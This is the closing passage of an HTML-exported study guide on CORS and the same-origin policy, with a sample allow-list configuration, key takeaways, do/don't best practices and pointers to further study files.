class=""><strong>Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d2-9624-d5cb3cb77123" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: https://widget.example.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d6-87c8-db9c742b046c" class=""><strong>Alternative:</strong> Use postMessage API for better security.</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-803a-9da6-ca9ac307be13"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-80f2-90e6-db6c1cd4f3ed" class=""><strong>Summary</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-809b-87c6-cabf8b3d381a" class=""><strong>Key Takeaways</strong></h3></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8088-a40f-cc0c6f56f1d5" class="numbered-list" start="1"><li><strong>SOP restricts, CORS allows</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-801b-a66d-fab301ab8cb6" class="bulleted-list"><li style="list-style-type:disc">SOP is the default security mechanism</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8043-8f78-d76dc73ae6eb" class="bulleted-list"><li style="list-style-type:disc">CORS is the controlled relaxation</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80f4-a2e5-f92cf9b7e363" class="numbered-list" start="2"><li><strong>CORS is browser-enforced</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809b-ac1b-e38734f162c6" class="bulleted-list"><li style="list-style-type:disc">Direct requests bypass CORS</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-808f-a474-c73a5bf3b7e1" class="bulleted-list"><li style="list-style-type:disc">Only affects browser requests</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80fb-8364-fea6d6095845" class="numbered-list" start="3"><li><strong>Always validate Origin header</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8020-968b-fd3977e205ed" class="bulleted-list"><li style="list-style-type:disc">Don&#x27;t blindly reflect Origin</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-802b-bb38-d292210176fa" class="bulleted-list"><li style="list-style-type:disc">Use whitelist of allowed origins</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-807f-b6e3-d6b5ff61906b" class="numbered-list" start="4"><li><strong>Never use wildcard with credentials</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-802a-9f94-f5a17aa36a10" class="bulleted-list"><li style="list-style-type:disc"><code>Access-Control-Allow-Origin: *</code> + credentials = invalid</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-800c-93fe-f0bdcbc1a194" class="bulleted-list"><li style="list-style-type:disc">Browsers should reject, but don&#x27;t rely on it</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80c5-9efd-e8661b9a3b99" class="numbered-list" start="5"><li><strong>Implement proper preflight handling</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b7-823c-ef998b6a8d7e" class="bulleted-list"><li style="list-style-type:disc">Validate methods and headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80cb-b5cf-f3474333b3a9" class="bulleted-list"><li style="list-style-type:disc">Use appropriate Max-Age</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-804f-b4b2-c16dfe7a75ed" class="numbered-list" start="6"><li><strong>Test your CORS configuration</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-808c-a51e-c66f8a87fd3a" class="bulleted-list"><li style="list-style-type:disc">Manual testing with curl</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8086-aa3b-ffc3f1c2f37a" class="bulleted-list"><li style="list-style-type:disc">Browser testing</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80f0-9ad3-f4f5c5feb9bb" class="bulleted-list"><li style="list-style-type:disc">Automated scanning tools</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-805a-bb33-d52fb99f20f9" class=""><strong>Best Practices</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-803a-8e81-d5867aa95aa4" class="">✅ <strong>Do:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8006-8c72-de327fd00079" class="bulleted-list"><li style="list-style-type:disc">Use specific origins (whitelist)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807a-b361-c75247fb3cd6" class="bulleted-list"><li style="list-style-type:disc">Validate Origin header server-side</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8015-869a-ca65cb32fb55" class="bulleted-list"><li style="list-style-type:disc">Limit allowed methods and headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80f8-819d-e7a01197ff86" class="bulleted-list"><li style="list-style-type:disc">Use credentials only when necessary</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8094-ae39-c34429d943de" class="bulleted-list"><li style="list-style-type:disc">Test CORS configuration thoroughly</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8030-9c98-db572c77f690" class="">❌ <strong>Don&#x27;t:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8024-add5-f31d3c955f4e" class="bulleted-list"><li style="list-style-type:disc">Use wildcard with credentials</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8007-9017-eb3a1cd1d750" class="bulleted-list"><li style="list-style-type:disc">Blindly reflect Origin header</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80a5-a92f-c4e6be4f1d27" class="bulleted-list"><li style="list-style-type:disc">Allow unnecessary methods/headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-803a-b583-d7372de987a8" class="bulleted-list"><li style="list-style-type:disc">Skip preflight validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8025-8c01-f2f1beded384" class="bulleted-list"><li style="list-style-type:disc">Rely on CORS for server security</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8019-8551-e892ec28c461" class=""><strong>Remember</strong></h3></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8008-a9c1-ef9b072be2a0" class="bulleted-list"><li style="list-style-type:disc"><strong>SOP</strong> = Browser security (restricts)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809a-8e45-fb9f7e3e08bd" class="bulleted-list"><li style="list-style-type:disc"><strong>CORS</strong> = Controlled relaxation (allows)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-804f-b2e6-d37a3c0edca4" class="bulleted-list"><li style="list-style-type:disc"><strong>CORS headers</strong> = Server tells browser what to allow</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80cd-a84f-e15ba530790a" class="bulleted-list"><li style="list-style-type:disc"><strong>Browser</strong> = Enforces CORS based on server headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-806a-aaf0-ef347f12d1f0" class="bulleted-list"><li style="list-style-type:disc"><strong>Direct requests</strong> = Bypass CORS entirely</li></ul></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8097-a7f1-de9e90c6b5ed"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-803d-99c4-e9e7e77cce0b" class=""><strong>Next Steps</strong></h2></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80f7-8f73-fc945ce1454d" class="bulleted-list"><li style="list-style-type:disc">Review <code>02_INTERVIEW_QUESTIONS.md</code> for practice</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8017-976d-ed7d6f6a9590" class="bulleted-list"><li style="list-style-type:disc">Check <code>03_QUICK_REFERENCE.md</code> for quick lookup</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b5-8137-f883bebfeae1" class="bulleted-list"><li style="list-style-type:disc">Test CORS configuration in your applications</li></ul></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
